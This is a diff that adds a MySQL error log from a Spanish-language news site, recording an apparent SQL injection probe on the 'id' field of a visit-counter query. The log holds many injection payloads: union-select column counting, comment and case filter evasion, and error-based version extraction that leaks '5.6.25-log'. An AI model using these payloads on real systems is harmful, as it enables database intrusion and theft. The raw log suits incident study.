@@ -1,0 +1,143 @@
+Time : 16:00:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 16:00:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 05:02:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'5.6.25-log'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(version() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+Time : 04:43:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'un/**/ion sel/**/ect 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 un/**/ion sel/**/ect 1-- hkuh
+
+Time : 04:43:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'un/**/ion (select)1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 un/**/ion (select)1-- hkuh
+
+Time : 04:43:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(un/**/ion)(select)1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486(un/**/ion)(select)1-- hkuh
+
+Time : 04:43:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(union)(select)1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486(union)(select)1-- hkuh
+
+Time : 04:42:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union/**/select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486/**/union/**/select 1-- hkuh
+
+Time : 04:42:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486/**/union select 1-- hkuh
+
+Time : 04:41:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn seLect 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 uNiOn seLect 1-- hkuh
+
+Time : 04:41:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 uNiOn select 1-- hkuh
+
+Time : 04:41:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 union select 1-- hkuh
+
+Time : 04:38:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'u/**/nion select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 u/**/nion select 1-- hkuh
+
+Time : 04:38:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 union select 1-- hkuh
+
+Time : 04:38:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1,2,3,4,5,6,7,8,9,10 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=-7486 union select 1,2,3,4,5,6,7,8,9,10 -- hkuh
+
+Time : 04:38:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5,6,7,8,9,10 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5,6,7,8,9,10 -- hkuh
+
+Time : 04:38:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5,6,7,8,9 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5,6,7,8,9 -- hkuh
+
+Time : 04:37:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5,6,7,8 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5,6,7,8 -- hkuh
+
+Time : 04:37:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 04:36:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5,6,7 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5,6,7 -- hkuh
+
+Time : 04:36:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5,6 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5,6 -- hkuh
+
+Time : 04:36:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4,5 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4,5 -- hkuh
+
+Time : 04:36:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3,4 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3,4 -- hkuh
+
+Time : 04:36:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2,3 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2,3 -- hkuh
+
+Time : 04:36:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1,2 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1,2 -- hkuh
+
+Time : 04:36:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select 1 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' union select 1 -- hkuh
+
+Time : 04:35:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' -- hkuh
+
+Time : 04:35:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1-- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486 or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1-- hkuh
+
+Time : 04:33:51
+SQLSTATE[42S22]: Column not found: 1054 Unknown column '1000' in 'order clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486 order by 1000 -- hkuh
+
+Time : 04:33:42
+SQLSTATE[42S22]: Column not found: 1054 Unknown column '1' in 'order clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486 order by 1 -- hkuh
+
+Time : 04:33:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by 1 -- hkuh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486' order by 1 -- hkuh
+
+Time : 04:33:11
+SQLSTATE[42S22]: Column not found: 1054 Unknown column '1' in 'order clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7486 order by 1 -- hkuh
+
+Time : 04:23:41
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 04:22:51
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 04:22:25
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 04:22:15
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 04:20:38
+SQLSTATE[HY000]: General error: 2006 MySQL server has gone away
+Raw SQL : SELECT * FROM noticias order by date desc limit 15
